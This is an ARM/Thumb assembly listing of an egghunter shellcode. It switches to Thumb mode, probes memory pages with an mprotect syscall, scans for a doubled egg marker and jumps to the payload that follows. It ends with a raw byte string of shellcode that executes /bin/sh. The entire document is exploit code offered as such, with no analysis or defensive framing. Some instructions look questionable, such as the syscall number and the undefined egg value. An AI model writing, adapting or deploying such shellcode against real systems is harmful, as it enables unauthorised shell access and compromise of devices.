.section .text
.global _start

_start:
.code 32
        add    r1, pc, #1      
        bx     r1
.code 16
        eor    r5, r5, r5      
        mov    r7, #0x7d       
        mov    r1, #1
        lsl    r1, #12         
        mov    r2, #7           

syscall_loop:
        mov    r0, r5
        svc    #1           
        add    r0, r0, #12      
        bne    valid_page
        add    r5, r5, r1     
        b      syscall_loop

valid_page:
        add    r6, r5, r1      
        ldr    r0, [pc, #20]  
next_eggs:
        ldr    r3, [r5]
        add    r5, r5, #4      
        cmp    r5, r6         
        beq    syscall_loop
        ldr    r4, [r5]
        cmp    r0, r3           
        bne    next_eggs

verify_egg:
        cmp    r3, r4         
        bne    next_eggs        
        add    r5, r5, #4       
        bx     r5


.ascii	"\x90"
.ascii	"\x90"
.ascii	"\x90"
.ascii	"\x90"
.ascii	"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\x0b\x27\xc1\x71\x01\xdf/bin/shX"
